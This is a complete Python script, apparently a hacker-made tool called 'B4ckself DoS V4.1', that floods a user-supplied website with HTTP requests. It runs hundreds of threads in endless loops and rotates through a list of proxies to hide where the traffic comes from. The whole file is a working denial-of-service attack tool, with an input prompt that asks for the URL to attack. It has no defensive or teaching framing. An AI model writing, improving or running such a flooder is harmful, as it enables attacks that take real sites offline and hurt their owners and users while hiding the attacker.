import urllib.request, os, threading, time, random, sys

class Spammer(threading.Thread):
    
    def __init__(self, url, number, lista):
        threading.Thread.__init__(self)
        self.url = url
        self.num = number
        self.headers = { 'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)' }
        self.Lock = threading.Lock()
        self.lista = lista

    def request(self):
        global N
        data = None
        if N >= (len(self.lista) - 1):
            N = 0
        proxy = urllib.request.ProxyHandler({'http': self.lista[N]})
        opener = urllib.request.build_opener(proxy)
        urllib.request.install_opener(opener) 
        req = urllib.request.Request(self.url, data, self.headers)
        urllib.request.urlopen(req)
        sys.stdout.write("Thread #%4d | %4d\%d | Proxy@%s"%(self.num, N, len(self.lista), self.lista[N]))
            
    def run(self):
        global N
        self.Lock.acquire()
        print ("Thread #%4d |"% (self.num))
        self.Lock.release()
        time.sleep(1)
        while True:
            try:
                N += 1
                self.request()
            except:
                pass
                #sys.stdout.write("Thread #%4d |\t\t  | Proxy@Connection refused...\n"%(self.num))   
        sys.exit(0)

class MainLoop():
    
    def __init__(self):
        if os.name in ("nt", "dos", "ce"):
            os.system('cls')
            os.system('title       ........:::::   B4ckself DoS V4.1   :::::........        Python 3.3.3')
            os.system('color a')
            color = ['a', 'b', 'c', 'd', 'e', 'f']
            os.system('color %s' % (color[random.randrange(0, 5, 1)]))
        print ('\n                     ###################################\n')
        print ('                 01010o.....::B4ckself DoS V4.1::.....o01010\n')
        print ('              #################################################')
        print ('\n\t  A DoS Concept for HTTP site, Coded by B4ckdoor\n')
        print ('\t                ProxyHandling by Sikh887             \n\n')
    
    def check_url(self, url):
        if url[0]+url[1]+url[2]+url[3] == "www.":
            url = "http://" + url
        elif url[0]+url[1]+url[2]+url[3] == "http":
            pass
        else:
            url = "http://" + url
        return url

    def setup(self):
        global Close, Request, Tot_req
        while True:        
            url = input('> Enter Url to DoS: ')
            url = self.check_url(url)
            try:
                req = urllib.request.Request(url, None, {'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'})
                response = urllib.request.urlopen(req)
                break
            except:
                print ('> Could not open specified url.')
        while True:            
            try:
                l = str(input('> Enter the list of proxy: '))
                in_file = open(l,"r")
                lista = []
                for i in in_file:
                    lista.append(i.split("/n")[0])
                break
            except:
                print ('Error to read file.')
        while True:                
            try:
                num_threads = int(input('> Enter the number of thread [800]: '))
            except:
                num_threads = 800
            break

        for i in range(num_threads):
            Spammer(url, i + 1, lista).start()
        
if __name__ == '__main__':
    N = 0
    b = MainLoop()
    b.setup()